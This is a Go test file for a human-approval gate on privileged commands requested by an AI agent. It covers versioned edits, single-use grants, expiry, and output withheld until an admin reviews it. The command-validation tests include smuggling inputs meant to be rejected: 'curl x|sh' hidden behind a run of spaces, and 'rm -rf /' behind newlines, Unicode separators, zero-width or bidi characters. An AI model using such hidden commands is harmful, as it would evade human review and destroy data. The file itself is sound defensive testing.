package sudo

import (
	"context"
	"errors"
	"strings"
	"sync"
	"testing"
	"time"
)

type clock struct {
	mu  sync.Mutex
	now time.Time
}

func (c *clock) Now() time.Time {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.now
}

func (c *clock) Advance(d time.Duration) {
	c.mu.Lock()
	c.now = c.now.Add(d)
	c.mu.Unlock()
}

var (
	alice = Actor{ID: "u-alice", Name: "alice"}
	bob   = Actor{ID: "u-bob", Name: "bob"}
)

func newTestStore() (*Store, *clock) {
	c := &clock{now: time.Date(2026, 11, 16, 12, 0, 0, 0, time.UTC)}
	return NewStore(DefaultLimits(), c.Now), c
}

func create(t *testing.T, s *Store, command string) Request {
	t.Helper()
	r, err := s.Create(CreateInput{Origin: Origin{HostID: "host-agents", Session: "claude", Pane: "%1"}, Command: command, Reason: "installer un paquet"})
	if err != nil {
		t.Fatalf("Create: %v", err)
	}
	return r
}

func TestValidateCommand(t *testing.T) {
	tests := []struct {
		name    string
		command string
		ok      bool
	}{
		{"simple", "apt-get install -y jq", true},
		{"single spaces", "apt-get install -y jq && echo ok", true},
		{"two spaces", "echo  ok", true},
		{"accents", "echo café", true},
		{"tab", "echo\tok", false},
		{"run of spaces hides a payload", "apt-get install jq" + strings.Repeat(" ", 300) + "; curl x|sh", false},
		{"three spaces", "echo   ok", false},
		{"run of no-break spaces", "echo \u00a0\u00a0\u00a0ok", false},
		{"C1 control", "echo \u009b2J", false},
		{"bidi override", "echo \u202eok", false},
		{"bidi isolate", "echo \u2066ok\u2069", false},
		{"zero width space", "rm\u200b -rf", false},
		{"byte order mark", "\ufeffecho", false},
		{"line separator", "true\u2028rm -rf /", false},
		{"paragraph separator", "true\u2029rm -rf /", false},
		{"1000 characters", strings.Repeat("é", MaxCommandRunes), true},
		{"1001 characters", strings.Repeat("a", MaxCommandRunes+1), false},
		{"empty", "", false},
		{"blank", "   ", false},
		{"newline hides a second command", "true\nrm -rf /", false},
		{"carriage return", "true\rrm", false},
		{"escape sequence", "echo \x1b[2J", false},
		{"nul", "echo \x00", false},
		{"too long", strings.Repeat("a", MaxCommandBytes+1), false},
		{"invalid utf8", "echo \xff", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if err := ValidateCommand(tt.command); (err == nil) != tt.ok {
				t.Fatalf("ValidateCommand(%q) = %v, want ok=%v", tt.command, err, tt.ok)
			}
		})
	}
}

func TestValidateReason(t *testing.T) {
	tests := []struct {
		name   string
		reason string
		ok     bool
	}{
		{"empty", "", true},
		{"simple", "installer jq pour lire du JSON", true},
		{"newline", "ok\nrm", false},
		{"bidi", "ok \u202e", false},
		{"run of spaces", "ok" + strings.Repeat(" ", 10) + "caché", false},
		{"too long", strings.Repeat("a", MaxReasonBytes+1), false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if err := ValidateReason(tt.reason); (err == nil) != tt.ok {
				t.Fatalf("ValidateReason(%q) = %v, want ok=%v", tt.reason, err, tt.ok)
			}
		})
	}
}

func TestLifecycle(t *testing.T) {
	type step struct {
		name   string
		run    func(s *Store, c *clock, r *Request, g *Grant) error
		status Status
		err    error
	}
	approve := func(version int) func(*Store, *clock, *Request, *Grant) error {
		return func(s *Store, _ *clock, r *Request, g *Grant) error {
			updated, grant, err := s.Approve(r.ID, version, "peer-admin", alice)
			if err == nil {
				*r, *g = updated, grant
			}
			return err
		}
	}
	redeem := func(by Actor) func(*Store, *clock, *Request, *Grant) error {
		return func(s *Store, _ *clock, r *Request, g *Grant) error {
			updated, err := s.Redeem(g.Token, by)
			if err == nil {
				*r = updated
			}
			return err
		}
	}
	finish := func(s *Store, _ *clock, r *Request, _ *Grant) error {
		updated, err := s.Finish(r.ID, Capture{Version: r.Version, ExitCode: 0, Output: "ok\n"})
		if err == nil {
			*r = updated
		}
		return err
	}
	edit := func(version int, command string) func(*Store, *clock, *Request, *Grant) error {
		return func(s *Store, _ *clock, r *Request, _ *Grant) error {
			updated, err := s.Edit(r.ID, version, command, bob)
			if err == nil {
				*r = updated
			}
			return err
		}
	}
	review := func(d Decision) func(*Store, *clock, *Request, *Grant) error {
		return func(s *Store, _ *clock, r *Request, _ *Grant) error {
			updated, err := s.Review(r.ID, d, alice, "")
			if err == nil {
				*r = updated
			}
			return err
		}
	}
	advance := func(d time.Duration) func(*Store, *clock, *Request, *Grant) error {
		return func(s *Store, c *clock, r *Request, _ *Grant) error {
			c.Advance(d)
			updated, _ := s.Get(r.ID)
			*r = updated
			return nil
		}
	}
	tests := []struct {
		name  string
		steps []step
	}{
		{"happy path", []step{
			{"approve", approve(1), StatusApproved, nil},
			{"redeem", redeem(alice), StatusRunning, nil},
			{"finish", finish, StatusAwaitingReview, nil},
			{"send", review(DecisionSend), StatusDelivered, nil},
		}},
		{"edit then approve the new version", []step{
			{"edit", edit(1, "apt-get install -y jq=1.7"), StatusPending, nil},
			{"stale approve", approve(1), StatusPending, ErrVersionMismatch},
			{"approve", approve(2), StatusApproved, nil},
		}},
		{"stale edit is rejected", []step{
			{"edit", edit(1, "true"), StatusPending, nil},
			{"second edit on v1", edit(1, "false"), StatusPending, ErrVersionMismatch},
		}},
		{"grant is single use", []step{
			{"approve", approve(1), StatusApproved, nil},
			{"redeem", redeem(alice), StatusRunning, nil},
			{"redeem again", redeem(alice), StatusRunning, ErrGrantInvalid},
		}},
		{"grant belongs to the approver", []step{
			{"approve", approve(1), StatusApproved, nil},
			{"other admin", redeem(bob), StatusApproved, ErrGrantInvalid},
		}},
		{"unused grant returns to pending", []step{
			{"approve", approve(1), StatusApproved, nil},
			{"wait", advance(61 * time.Second), StatusPending, nil},
			{"late redeem", redeem(alice), StatusPending, ErrGrantInvalid},
		}},
		{"no edit while approved", []step{
			{"approve", approve(1), StatusApproved, nil},
			{"edit", edit(1, "true"), StatusApproved, ErrInvalidState},
		}},
		{"pending expires", []step{
			{"wait", advance(16 * time.Minute), StatusExpired, nil},
			{"approve", approve(1), StatusExpired, ErrInvalidState},
		}},
		{"unreviewed output is withheld", []step{
			{"approve", approve(1), StatusApproved, nil},
			{"redeem", redeem(alice), StatusRunning, nil},
			{"finish", finish, StatusAwaitingReview, nil},
			{"wait", advance(31 * time.Minute), StatusWithheld, nil},
		}},
		{"silent terminal fails", []step{
			{"approve", approve(1), StatusApproved, nil},
			{"redeem", redeem(alice), StatusRunning, nil},
			{"wait", advance(17 * time.Minute), StatusFailed, nil},
		}},
		{"review before run is impossible", []step{
			{"send", review(DecisionSend), StatusPending, ErrInvalidState},
		}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			s, c := newTestStore()
			r := create(t, s, "apt-get install -y jq")
			var g Grant
			for _, st := range tt.steps {
				err := st.run(s, c, &r, &g)
				if !errors.Is(err, st.err) {
					t.Fatalf("%s: err = %v, want %v", st.name, err, st.err)
				}
				current, _ := s.Get(r.ID)
				if current.Status != st.status {
					t.Fatalf("%s: status = %s, want %s", st.name, current.Status, st.status)
				}
			}
		})
	}
}

func TestAgentView(t *testing.T) {
	tests := []struct {
		name       string
		decision   Decision
		edited     bool
		status     Status
		wantOutput bool
		wantCode   bool
	}{
		{"send", DecisionSend, false, StatusDelivered, true, true},
		{"exit code only", DecisionExitCode, false, StatusDelivered, false, true},
		{"nothing", DecisionNothing, false, StatusWithheld, false, false},
		{"modified", DecisionSend, true, StatusDelivered, true, true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			s, _ := newTestStore()
			r := create(t, s, "id -u")
			if tt.edited {
				r, _ = s.Edit(r.ID, 1, "id -un", alice)
			}
			_, g, err := s.Approve(r.ID, r.Version, "peer-admin", alice)
			if err != nil {
				t.Fatal(err)
			}
			r, _ = s.Redeem(g.Token, alice)
			if _, err := s.Finish(r.ID, Capture{Version: r.Version, ExitCode: 3, Output: "0\n"}); err != nil {
				t.Fatal(err)
			}
			r, err = s.Review(r.ID, tt.decision, alice, "vu")
			if err != nil {
				t.Fatal(err)
			}
			view := r.View()
			if view.Status != tt.status || (view.Output != "") != tt.wantOutput || (view.ExitCode != nil) != tt.wantCode {
				t.Fatalf("view = %+v", view)
			}
			if view.CommandRequested != "id -u" || view.Modified != tt.edited {
				t.Fatalf("command fields = %+v", view)
			}
		})
	}
}

func TestViewHidesCaptureBeforeReview(t *testing.T) {
	s, _ := newTestStore()
	r := create(t, s, "id")
	_, g, _ := s.Approve(r.ID, 1, "peer-admin", alice)
	s.Redeem(g.Token, alice)
	r, _ = s.Finish(r.ID, Capture{Version: 1, Output: "uid=0(root)"})
	if view := r.View(); view.Output != "" || view.ExitCode != nil || view.Status != StatusAwaitingReview {
		t.Fatalf("capture leaked before review: %+v", view)
	}
}

func TestRerunRequiresNewApproval(t *testing.T) {
	s, _ := newTestStore()
	r := create(t, s, "false")
	_, g, _ := s.Approve(r.ID, 1, "peer-admin", alice)
	s.Redeem(g.Token, alice)
	s.Finish(r.ID, Capture{Version: 1, ExitCode: 1})
	r, err := s.Rerun(r.ID, 1, "true", alice)
	if err != nil || r.Status != StatusPending || r.Version != 2 || r.Capture != nil {
		t.Fatalf("Rerun = %+v, %v", r, err)
	}
}

func TestCancelOnlyFromOriginHost(t *testing.T) {
	s, _ := newTestStore()
	r := create(t, s, "true")
	if _, err := s.Cancel(r.ID, "host-other"); !errors.Is(err, ErrForbidden) {
		t.Fatalf("Cancel from other host = %v", err)
	}
	if r, err := s.Cancel(r.ID, "host-agents"); err != nil || r.Status != StatusCancelled {
		t.Fatalf("Cancel = %+v, %v", r, err)
	}
}

func TestLimitsPerHost(t *testing.T) {
	s, _ := newTestStore()
	for range DefaultLimits().MaxPerHost {
		create(t, s, "true")
	}
	if _, err := s.Create(CreateInput{Origin: Origin{HostID: "host-agents"}, Command: "true"}); !errors.Is(err, ErrTooMany) {
		t.Fatalf("Create past limit = %v", err)
	}
}

func TestWaitReturnsOnFinalState(t *testing.T) {
	s, _ := newTestStore()
	r := create(t, s, "true")
	done := make(chan Request, 1)
	go func() {
		got, _ := s.Wait(context.Background(), r.ID)
		done <- got
	}()
	time.Sleep(20 * time.Millisecond)
	if _, err := s.Refuse(r.ID, alice, "non"); err != nil {
		t.Fatal(err)
	}
	select {
	case got := <-done:
		if got.Status != StatusRefused || got.View().Note != "non" {
			t.Fatalf("Wait = %+v", got)
		}
	case <-time.After(3 * time.Second):
		t.Fatal("Wait did not return")
	}
}

func TestWaitHonoursContext(t *testing.T) {
	s, _ := newTestStore()
	r := create(t, s, "true")
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Millisecond)
	defer cancel()
	got, err := s.Wait(ctx, r.ID)
	if err != nil || got.Status != StatusPending {
		t.Fatalf("Wait = %+v, %v", got, err)
	}
}

func TestOnChange(t *testing.T) {
	s, _ := newTestStore()
	var seen []Status
	s.OnChange(func(r Request) { seen = append(seen, r.Status) })
	r := create(t, s, "true")
	s.Refuse(r.ID, alice, "")
	if len(seen) != 2 || seen[0] != StatusPending || seen[1] != StatusRefused {
		t.Fatalf("changes = %v", seen)
	}
}
